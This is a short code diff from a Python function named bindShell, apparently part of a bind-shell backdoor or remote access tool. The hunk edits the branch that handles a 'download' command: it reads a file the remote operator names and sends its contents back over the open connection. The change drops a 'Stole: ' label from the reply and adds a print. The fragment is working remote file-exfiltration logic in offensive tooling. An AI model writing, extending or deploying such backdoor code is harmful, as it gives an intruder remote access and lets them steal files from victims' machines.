@@ -82,15 +82,8 @@ def bindShell() -> None:
                     elif args[0] == download_cmd:
                         fileDL_command = args[1]
                         fileDL_send = download_file(fileDL_command)
-                        message = (
-                            b"Stole: "
-                            + fileDL_command.encode("utf-8")
-                            + b"\n"
-                            + fileDL_send
-                            + b"\n"
-                            + b"-" * 20
-                            + b"\n"
-                        )
+                        message = fileDL_send
+                        print(message)
                         conn.send(message)
 
                     # upload
